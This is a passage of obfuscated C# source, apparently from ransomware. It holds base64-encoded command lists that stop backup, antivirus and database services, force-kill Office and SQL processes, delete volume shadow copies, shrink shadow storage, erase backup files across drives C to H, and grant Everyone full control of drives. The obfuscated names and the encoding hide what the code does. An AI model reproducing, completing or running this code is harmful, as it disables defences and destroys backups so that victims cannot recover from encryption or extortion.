		PBGxcXGgCq("c3RvcCBZb29CYWNrdXAgL3k="),
		PBGxcXGgCq("c3RvcCBZb29JVCAveQ=="),
		PBGxcXGgCq("c3RvcCB6aHVkb25nZmFuZ3l1IC95"),
		PBGxcXGgCq("c3RvcCBzdGNfcmF3X2FnZW50IC95"),
		PBGxcXGgCq("c3RvcCBWU05BUFZTUyAveQ=="),
		PBGxcXGgCq("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		PBGxcXGgCq("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		PBGxcXGgCq("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		PBGxcXGgCq("c3RvcCB2ZWVhbSAveQ=="),
		PBGxcXGgCq("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		PBGxcXGgCq("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		PBGxcXGgCq("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		PBGxcXGgCq("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		PBGxcXGgCq("c3RvcCBCYWNrdXBFeGVjRGl2ZWNpTWVkaWFTZXJ2aWNlIC95"),
		PBGxcXGgCq("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		PBGxcXGgCq("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		PBGxcXGgCq("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		PBGxcXGgCq("c3RvcCBBY3JTY2gyU3ZjIC95"),
		PBGxcXGgCq("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		PBGxcXGgCq("c3RvcCBDQVNBRDJEV2ViU3ZjIC95"),
		PBGxcXGgCq("c3RvcCBDQUFSQ1VwZGF0ZVN2YyAveQ=="),
		PBGxcXGgCq("c3RvcCBzb3Bob3MgL3k="),
		PBGxcXGgCq("c3RvcCDigJxBY3JvbmlzIFZTUyBQcm92aWRlcuKAnSAveQ=="),
		PBGxcXGgCq("c3RvcCBNc0R0c1NlcnZlciAveQ=="),
		PBGxcXGgCq("c3RvcCBJSVNBZG1pbiAveQ=="),
		PBGxcXGgCq("c3RvcCBNU0V4Y2hhbmdlRVMgL3k="),
		PBGxcXGgCq("c3RvcCDigJxTb3Bob3MgQWdlbnTigJ0gL3k="),
		PBGxcXGgCq("c3RvcCBFcmFzZXJTdmMxMTcxMCAveQ=="),
		PBGxcXGgCq("c3RvcCDigJxFbnRlcnByaXNlIENsaWVudCBTZXJ2aWNl4oCdIC95"),
		PBGxcXGgCq("c3RvcCDigJxTUUwgQmFja3VwcyAveQ=="),
		PBGxcXGgCq("c3RvcCBNc0R0c1NlcnZlcjEwMCAveQ=="),
		PBGxcXGgCq("c3RvcCBOZXRNc21xQWN0aXZhdG9yIC95"),
		PBGxcXGgCq("c3RvcCBNU0V4Y2hhbmdlSVMgL3k="),
		PBGxcXGgCq("c3RvcCDigJxTb3Bob3MgQXV0b1VwZGF0ZSBTZXJ2aWNl4oCdIC95"),
		PBGxcXGgCq("c3RvcCBTYW1TcyAveQ=="),
		PBGxcXGgCq("c3RvcCBSZXBvcnRTZXJ2ZXIgL3k="),
		PBGxcXGgCq("c3RvcCDigJxTUUxzYWZlIEJhY2t1cCBTZXJ2aWNl4oCdIC95"),
		PBGxcXGgCq("c3RvcCBNc0R0c1NlcnZlcjExMCAveQ=="),
		PBGxcXGgCq("c3RvcCBQT1AzU3ZjIC95"),
		PBGxcXGgCq("c3RvcCBNU0V4Y2hhbmdlTUdNVCAveQ=="),
		PBGxcXGgCq("c3RvcCDigJxTb3Bob3MgQ2xlYW4gU2VydmljZeKAnSAveQ=="),
		PBGxcXGgCq("c3RvcCBTTVRQU3ZjIC95"),
		PBGxcXGgCq("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		PBGxcXGgCq("c3RvcCDigJxTUUxzYWZlIEZpbHRlciBTZXJ2aWNl4oCdIC95"),
		PBGxcXGgCq("c3RvcCBtc2Z0ZXNxbCRQUk9EIC95"),
		PBGxcXGgCq("c3RvcCBTc3RwU3ZjIC95"),
		PBGxcXGgCq("c3RvcCBNU0V4Y2hhbmdlTVRBIC95"),
		PBGxcXGgCq("c3RvcCDigJxTb3Bob3MgRGV2aWNlIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		PBGxcXGgCq("c3RvcCBSZXBvcnRTZXJ2ZXIkU1lTVEVNX0JHQyAveQ=="),
		PBGxcXGgCq("c3RvcCDigJxTeW1hbnRlYyBTeXN0ZW0gUmVjb3ZlcnnigJ0gL3k="),
		PBGxcXGgCq("c3RvcCBNU09MQVAkU1FMXzIwMDggL3k="),
		PBGxcXGgCq("c3RvcCBVSTBEZXRlY3QgL3k="),
		PBGxcXGgCq("c3RvcCBNU0V4Y2hhbmdlU0EgL3k="),
		PBGxcXGgCq("c3RvcCDigJxTb3Bob3MgRmlsZSBTY2FubmVyIFNlcnZpY2XigJ0gL3k="),
		PBGxcXGgCq("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTIC95"),
		PBGxcXGgCq("c3RvcCDigJxWZWVhbSBCYWNrdXAgQ2F0YWxvZyBEYXRhIFNlcnZpY2XigJ0gL3k="),
		PBGxcXGgCq("c3RvcCBNU09MQVAkU1lTVEVNX0JHQyAveQ=="),
		PBGxcXGgCq("c3RvcCBXM1N2YyAveQ=="),
		PBGxcXGgCq("c3RvcCBNU0V4Y2hhbmdlU1JTIC95"),
		PBGxcXGgCq("c3RvcCDigJxTb3Bob3MgSGVhbHRoIFNlcnZpY2XigJ0gL3k="),
		PBGxcXGgCq("c3RvcCBSZXBvcnRTZXJ2ZXIkVFBTQU1BIC95"),
		PBGxcXGgCq("c3RvcCDigJxab29seiAyIFNlcnZpY2XigJ0gL3k="),
		PBGxcXGgCq("c3RvcCBNU09MQVAkVFBTIC95"),
		PBGxcXGgCq("c3RvcCDigJxhcGhpZG1vbml0b3JzZXJ2aWNl4oCdIC95"),
		PBGxcXGgCq("c3RvcCBtc2V4Y2hhbmdlYWR0b3BvbG9neSAveQ=="),
		PBGxcXGgCq("c3RvcCDigJxTb3Bob3MgTUNTIEFnZW504oCdIC95"),
		PBGxcXGgCq("c3RvcCBBY3JTY2gyU3ZjIC95"),
		PBGxcXGgCq("c3RvcCBNU09MQVAkVFBTQU1BIC95"),
		PBGxcXGgCq("c3RvcCDigJxpbnRlbChyKSBwcm9zZXQgbW9uaXRvcmluZyBzZXJ2aWNl4oCdIC95"),
		PBGxcXGgCq("c3RvcCBtc2V4Y2hhbmdlaW1hcDQgL3k="),
		PBGxcXGgCq("c3RvcCDigJxTb3Bob3MgTUNTIENsaWVudOKAnSAveQ=="),
		PBGxcXGgCq("c3RvcCBBUlNNIC95"),
		PBGxcXGgCq("c3RvcCBNU1NRTCRCS1VQRVhFQyAveQ=="),
		PBGxcXGgCq("c3RvcCB1bmlzdG9yZXN2Y18xYWY0MGEgL3k="),
		PBGxcXGgCq("c3RvcCDigJxTb3Bob3MgTWVzc2FnZSBSb3V0ZXLigJ0gL3k="),
		PBGxcXGgCq("c3RvcCBCYWNrdXBFeGVjQWdlbnRBY2NlbGVyYXRvciAveQ=="),
		PBGxcXGgCq("c3RvcCBNU1NRTCRFQ1dEQjIgL3k="),
		PBGxcXGgCq("c3RvcCBhdWRpb2VuZHBvaW50YnVpbGRlciAveQ=="),
		PBGxcXGgCq("c3RvcCDigJxTb3Bob3MgU2FmZXN0b3JlIFNlcnZpY2XigJ0gL3k="),
		PBGxcXGgCq("c3RvcCBCYWNrdXBFeGVjQWdlbnRCcm93c2VyIC95"),
		PBGxcXGgCq("c3RvcCBNU1NRTCRQUkFDVElDRU1HVCAveQ=="),
		PBGxcXGgCq("c3RvcCDigJxTb3Bob3MgU3lzdGVtIFByb3RlY3Rpb24gU2VydmljZeKAnSAveQ=="),
		PBGxcXGgCq("c3RvcCBCYWNrdXBFeGVjRGV2aWNlTWVkaWFTZXJ2aWNlIC95"),
		PBGxcXGgCq("c3RvcCBNU1NRTCRQUkFDVFRJQ0VCR0MgL3k="),
		PBGxcXGgCq("c3RvcCDigJxTb3Bob3MgV2ViIENvbnRyb2wgU2VydmljZeKAnSAveQ=="),
		PBGxcXGgCq("c3RvcCBCYWNrdXBFeGVjSm9iRW5naW5lIC95"),
		PBGxcXGgCq("c3RvcCBNU1NRTCRQUk9EIC95"),
		PBGxcXGgCq("c3RvcCBBY3JvbmlzQWdlbnQgL3k="),
		PBGxcXGgCq("c3RvcCBCYWNrdXBFeGVjTWFuYWdlbWVudFNlcnZpY2UgL3k="),
		PBGxcXGgCq("c3RvcCBNU1NRTCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		PBGxcXGgCq("c3RvcCBBbnRpdmlydXMgL3k="),
		PBGxcXGgCq("c3RvcCBCYWNrdXBFeGVjUlBDU2VydmljZSAveQ=="),
		PBGxcXGgCq("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC8="),
		PBGxcXGgCq("c3RvcCBNU1NRTCRTQlNNT05JVE9SSU5HIC95"),
		PBGxcXGgCq("c3RvcCBBVlAgL3k="),
		PBGxcXGgCq("c3RvcCBCYWNrdXBFeGVjVlNTUHJvdmlkZXIgL3k="),
		PBGxcXGgCq("c3RvcCBNU1NRTCRTSEFSRVBPSU5UIC95"),
		PBGxcXGgCq("c3RvcCBEQ0FnZW50IC95"),
		PBGxcXGgCq("c3RvcCBiZWRiZyAveQ=="),
		PBGxcXGgCq("c3RvcCBNU1NRTCRTUUxfMjAwOCAveQ=="),
		PBGxcXGgCq("c3RvcCBFaHR0cFNydiAveQ=="),
		PBGxcXGgCq("c3RvcCBNTVMgL3k="),
		PBGxcXGgCq("c3RvcCBNU1NRTCRTUUxFWFBSRVNTIC95"),
		PBGxcXGgCq("c3RvcCBla3JuIC95"),
		PBGxcXGgCq("c3RvcCBtb3p5cHJvYmFja3VwIC95"),
		PBGxcXGgCq("c3RvcCBNU1NRTCRTWVNURU1fQkdDIC95"),
		PBGxcXGgCq("c3RvcCBFUFNlY3VyaXR5U2VydmljZSAveQ=="),
		PBGxcXGgCq("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		PBGxcXGgCq("c3RvcCBNU1NRTCRUUFMgL3k="),
		PBGxcXGgCq("c3RvcCBFUFVwZGF0ZVNlcnZpY2UgL3k="),
		PBGxcXGgCq("c3RvcCBudHJ0c2NhbiAveQ=="),
		PBGxcXGgCq("c3RvcCBNU1NRTCRUUFNBTUEgL3k="),
		PBGxcXGgCq("c3RvcCBFc2dTaEtlcm5lbCAveQ=="),
		PBGxcXGgCq("c3RvcCBQRFZGU1NlcnZpY2UgL3k="),
		PBGxcXGgCq("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		PBGxcXGgCq("c3RvcCBFU0hBU1JWIC95"),
		PBGxcXGgCq("c3RvcCBTRFJTVkMgL3k="),
		PBGxcXGgCq("c3RvcCBNU1NRTCRWRUVBTVNRTDIwMTIgL3k="),
		PBGxcXGgCq("c3RvcCBGQV9TY2hlZHVsZXIgL3k="),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		PBGxcXGgCq("c3RvcCBNU1NRTEZETGF1bmNoZXIkUFJPRlhFTkdBR0VNRU5UIC95"),
		PBGxcXGgCq("c3RvcCBLQVZGUyAveQ=="),
		PBGxcXGgCq("c3RvcCBTUUxXcml0ZXIgL3k="),
		PBGxcXGgCq("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0JTTU9OSVRPUklORyAveQ=="),
		PBGxcXGgCq("c3RvcCBLQVZGU0dUIC95"),
		PBGxcXGgCq("c3RvcCBWZWVhbUJhY2t1cFN2YyAveQ=="),
		PBGxcXGgCq("c3RvcCBNU1NRTEZETGF1bmNoZXIkU0hBUkVQT0lOVCAveQ=="),
		PBGxcXGgCq("c3RvcCBrYXZmc3NscCAveQ=="),
		PBGxcXGgCq("c3RvcCBWZWVhbUJyb2tlclN2YyAveQ=="),
		PBGxcXGgCq("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1FMXzIwMDggL3k="),
		PBGxcXGgCq("c3RvcCBrbG5hZ2VudCAveQ=="),
		PBGxcXGgCq("c3RvcCBWZWVhbUNhdGFsb2dTdmMgL3k="),
		PBGxcXGgCq("c3RvcCBNU1NRTEZETGF1bmNoZXIkU1lTVEVNX0JHQyAveQ=="),
		PBGxcXGgCq("c3RvcCBtYWNtbnN2YyAveQ=="),
		PBGxcXGgCq("c3RvcCBWZWVhbUNsb3VkU3ZjIC95"),
		PBGxcXGgCq("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTIC95"),
		PBGxcXGgCq("c3RvcCBtYXN2YyAveQ=="),
		PBGxcXGgCq("c3RvcCBWZWVhbURlcGxveW1lbnRTZXJ2aWNlIC95"),
		PBGxcXGgCq("c3RvcCBNU1NRTEZETGF1bmNoZXIkVFBTQU1BIC95"),
		PBGxcXGgCq("c3RvcCBNQkFNU2VydmljZSAveQ=="),
		PBGxcXGgCq("c3RvcCBWZWVhbURlcGxveVN2YyAveQ=="),
		PBGxcXGgCq("c3RvcCBNU1NRTFNFUlZFUiAveQ=="),
		PBGxcXGgCq("c3RvcCBNQkVuZHBvaW50QWdlbnQgL3k="),
		PBGxcXGgCq("c3RvcCBWZWVhbUVudGVycHJpc2VNYW5hZ2VyU3ZjIC95"),
		PBGxcXGgCq("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyIC95"),
		PBGxcXGgCq("c3RvcCBNY0FmZWVFbmdpbmVTZXJ2aWNlIC95"),
		PBGxcXGgCq("c3RvcCBWZWVhbUh2SW50ZWdyYXRpb25TdmMgL3k="),
		PBGxcXGgCq("c3RvcCBNU1NRTFNlcnZlckFESGVscGVyMTAwIC95"),
		PBGxcXGgCq("c3RvcCBNY0FmZWVGcmFtZXdvcmsgL3k="),
		PBGxcXGgCq("c3RvcCBWZWVhbU1vdW50U3ZjIC95"),
		PBGxcXGgCq("c3RvcCBNU1NRTFNlcnZlck9MQVBTZXJ2aWNlIC95"),
		PBGxcXGgCq("c3RvcCBNY0FmZWVGcmFtZXdvcmtNY0FmZWVGcmFtZXdvcmsgL3k="),
		PBGxcXGgCq("c3RvcCBWZWVhbU5GU1N2YyAveQ=="),
		PBGxcXGgCq("c3RvcCBNeVNRTDU3IC95"),
		PBGxcXGgCq("c3RvcCBNY1NoaWVsZCAveQ=="),
		PBGxcXGgCq("c3RvcCBWZWVhbVJFU1RTdmMgL3k="),
		PBGxcXGgCq("c3RvcCBNeVNRTDgwIC95"),
		PBGxcXGgCq("c3RvcCBNY1Rhc2tNYW5hZ2VyIC95"),
		PBGxcXGgCq("c3RvcCBWZWVhbVRyYW5zcG9ydFN2YyAveQ=="),
		PBGxcXGgCq("c3RvcCBPcmFjbGVDbGllbnRDYWNoZTgwIC95"),
		PBGxcXGgCq("c3RvcCBtZmVmaXJlIC95"),
		PBGxcXGgCq("c3RvcCB3YmVuZ2luZSAveQ=="),
		PBGxcXGgCq("c3RvcCBSZXBvcnRTZXJ2ZXIkU1FMXzIwMDggL3k="),
		PBGxcXGgCq("c3RvcCBtZmVtbXMgL3k="),
		PBGxcXGgCq("c3RvcCB3YmVuZ2luZSAveQ=="),
		PBGxcXGgCq("c3RvcCBSRVN2YyAveQ=="),
		PBGxcXGgCq("c3RvcCBtZmV2dHAgL3k="),
		PBGxcXGgCq("c3RvcCBzbXNfc2l0ZV9zcWxfYmFja3VwIC95"),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRCS1VQRVhFQyAveQ=="),
		PBGxcXGgCq("c3RvcCBNU1NRTCRTT1BIT1MgL3k="),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRDSVRSSVhfTUVUQUZSQU1FIC95"),
		PBGxcXGgCq("c3RvcCBzYWNzdnIgL3k="),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRDWERCIC95"),
		PBGxcXGgCq("c3RvcCBTQVZBZG1pblNlcnZpY2UgL3k="),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRFQ1dEQjIgL3k="),
		PBGxcXGgCq("c3RvcCBTQVZTZXJ2aWNlIC95"),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VCR0MgL3k="),
		PBGxcXGgCq("c3RvcCBTZXBNYXN0ZXJTZXJ2aWNlIC95"),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRQUkFDVFRJQ0VNR1QgL3k="),
		PBGxcXGgCq("c3RvcCBTaE1vbml0b3IgL3k="),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRQUk9EIC95"),
		PBGxcXGgCq("c3RvcCBTbWNpbnN0IC95"),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRQUk9GWEVOR0FHRU1FTlQgL3k="),
		PBGxcXGgCq("c3RvcCBTbWNTZXJ2aWNlIC95"),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRTQlNNT05JVE9SSU5HIC95"),
		PBGxcXGgCq("c3RvcCBTbnRwU2VydmljZSAveQ=="),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRTSEFSRVBPSU5UIC95"),
		PBGxcXGgCq("c3RvcCBzb3Bob3NzcHMgL3k="),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRTUUxfMjAwOCAveQ=="),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRTT1BIT1MgL3k="),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRTUUxFWFBSRVNTIC95"),
		PBGxcXGgCq("c3RvcCBzdmNHZW5lcmljSG9zdCAveQ=="),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRTWVNURU1fQkdDIC95"),
		PBGxcXGgCq("c3RvcCBzd2lfZmlsdGVyIC95"),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRUUFMgL3k="),
		PBGxcXGgCq("c3RvcCBzd2lfc2VydmljZSAveQ=="),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRUUFNBTUEgL3k="),
		PBGxcXGgCq("c3RvcCBzd2lfdXBkYXRlIC95"),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMDhSMiAveQ=="),
		PBGxcXGgCq("c3RvcCBzd2lfdXBkYXRlXzY0IC95"),
		PBGxcXGgCq("c3RvcCBTUUxBZ2VudCRWRUVBTVNRTDIwMTIgL3k="),
		PBGxcXGgCq("c3RvcCBUbUNDU0YgL3k="),
		PBGxcXGgCq("c3RvcCBTUUxCcm93c2VyIC95"),
		PBGxcXGgCq("c3RvcCB0bWxpc3RlbiAveQ=="),
		PBGxcXGgCq("c3RvcCBTUUxTYWZlT0xSU2VydmljZSAveQ=="),
		PBGxcXGgCq("c3RvcCBUcnVlS2V5IC95"),
		PBGxcXGgCq("c3RvcCBTUUxTRVJWRVJBR0VOVCAveQ=="),
		PBGxcXGgCq("c3RvcCBUcnVlS2V5U2NoZWR1bGVyIC95"),
		PBGxcXGgCq("c3RvcCBTUUxURUxFTUVUUlkgL3k="),
		PBGxcXGgCq("c3RvcCBUcnVlS2V5U2VydmljZUhlbHBlciAveQ=="),
		PBGxcXGgCq("c3RvcCBTUUxURUxFTUVUUlkkRUNXREIyIC95"),
		PBGxcXGgCq("c3RvcCBXUlNWQyAveQ=="),
		PBGxcXGgCq("c3RvcCBtc3NxbCR2aW1fc3FsZXhwIC95"),
		PBGxcXGgCq("c3RvcCB2YXBpZW5kcG9pbnQgL3k=")
	};

	public static List<string> GdxeGEIwnI = new List<string>
	{
		PBGxcXGgCq("Y29uZmlnIERuc2NhY2hlIHN0YXJ0PSBhdXRv"),
		PBGxcXGgCq("Y29uZmlnIEZEUmVzUHViIHN0YXJ0PSBhdXRv"),
		PBGxcXGgCq("Y29uZmlnIFNTRFBTUlYgc3RhcnQ9IGF1dG8="),
		PBGxcXGgCq("Y29uZmlnIHVwbnBob3N0IHN0YXJ0PSBhdXRv"),
		PBGxcXGgCq("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		PBGxcXGgCq("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		PBGxcXGgCq("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		PBGxcXGgCq("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> eXHMwtDYRimS = new List<string>
	{
		PBGxcXGgCq("L0lNIG1zcHViLmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		PBGxcXGgCq("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		PBGxcXGgCq("L0lNIG15c3FsZC5leGUgL0Y="),
		PBGxcXGgCq("L0lNIHNxYmNvcmVzZXJ2aWNlLmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIGZpcmVmb3hjb25maWcuZXhlIC9G"),
		PBGxcXGgCq("L0lNIGFnbnRzdmMuZXhlIC9G"),
		PBGxcXGgCq("L0lNIHRoZWJhdC5leGUgL0Y="),
		PBGxcXGgCq("L0lNIHN0ZWFtLmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIGVuY3N2Yy5leGUgL0Y="),
		PBGxcXGgCq("L0lNIGV4Y2VsLmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIENOVEFvU01nci5leGUgL0Y="),
		PBGxcXGgCq("L0lNIHNxbHdyaXRlci5leGUgL0Y="),
		PBGxcXGgCq("L0lNIHRiaXJkY29uZmlnLmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIGRiZW5nNTAuZXhlIC9G"),
		PBGxcXGgCq("L0lNIHRoZWJhdDY0LmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIG9jb21tLmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIGluZm9wYXRoLmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIG1iYW10cmF5LmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIHpvb2x6LmV4ZSAvRg=="),
		PBGxcXGgCq("SU0gdGh1bmRlcmJpcmQuZXhlIC9G"),
		PBGxcXGgCq("L0lNIGRic25tcC5leGUgL0Y="),
		PBGxcXGgCq("L0lNIHhmc3N2Y2Nvbi5leGUgL0Y="),
		PBGxcXGgCq("L0lNIG1zcHViLmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIE50cnRzY2FuLmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIGlzcWxwbHVzc3ZjLmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIG9uZW5vdGUuZXhlIC9G"),
		PBGxcXGgCq("L0lNIFBjY05UTW9uLmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIG1zYWNjZXNzLmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIG91dGxvb2suZXhlIC9G"),
		PBGxcXGgCq("L0lNIHRtbGlzdGVuLmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIG1zZnRlc3FsLmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIHBvd2VycG50LmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		PBGxcXGgCq("L0lNIHZpc2lvLmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G"),
		PBGxcXGgCq("L0lNIHdpbndvcmQuZXhlIC9G"),
		PBGxcXGgCq("L0lNIG15c3FsZC1udC5leGUgL0Y="),
		PBGxcXGgCq("L0lNIHdvcmRwYWQuZXhlIC9G"),
		PBGxcXGgCq("L0lNIG15c3FsZC1vcHQuZXhlIC9G"),
		PBGxcXGgCq("L0lNIG9jYXV0b3VwZHMuZXhlIC9G"),
		PBGxcXGgCq("L0lNIG9jc3NkLmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIG9yYWNsZS5leGUgL0Y="),
		PBGxcXGgCq("L0lNIHNxbGFnZW50LmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIHNxbGJyb3dzZXIuZXhlIC9G"),
		PBGxcXGgCq("L0lNIHNxbHNlcnZyLmV4ZSAvRg=="),
		PBGxcXGgCq("L0lNIHN5bmN0aW1lLmV4ZSAvRg==")
	};

	public static List<string> seztnJtLWJCaQk = new List<string>
	{
		PBGxcXGgCq(JMzNoXUpAyhmZ("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR")),
		PBGxcXGgCq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		PBGxcXGgCq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		PBGxcXGgCq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		PBGxcXGgCq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		PBGxcXGgCq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		PBGxcXGgCq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		PBGxcXGgCq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		PBGxcXGgCq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		PBGxcXGgCq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		PBGxcXGgCq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		PBGxcXGgCq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		PBGxcXGgCq("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		PBGxcXGgCq(JMzNoXUpAyhmZ("=QXZpVXcvACbsF2LgM3dvRWYoNFIlRXZsVGR"))
	};

	public static string MJpSZxsXZLloG = PBGxcXGgCq("R2V0LVdtaU9iamVjdCBXaW4zMl9TaGFkb3djb3B5IHwgRm9yRWFjaC1PYmplY3QgeyAkX0RlbGV0ZSgpOyB9");

	public static List<string> QluxYAwyymIIcs = new List<string>
	{
		PBGxcXGgCq("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		PBGxcXGgCq("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		PBGxcXGgCq("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		PBGxcXGgCq("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		PBGxcXGgCq("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		PBGxcXGgCq("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static List<string> BLfjpxHHToj = new List<string>
	{
		PBGxcXGgCq("IkM6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		PBGxcXGgCq("IkQ6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E="),
		PBGxcXGgCq("Ilo6KiIgL2dyYW50IEV2ZXJ5b25lOkYgL1QgL0MgL1E=")
	};

	public static string hPMezbtNCii = "NO";

	public static string LKKeAczwGI = "NO";

	internal static DateTime kSYdplAigquFgpb = new DateTime(2000, 1, 1);

	internal static DateTime QpxyRESzFaCPTr = new DateTime(2100, 1, 1);

	public static string XqxyjwNQsTVM = "YES";

	public static string LvVedbSsouja = "10";

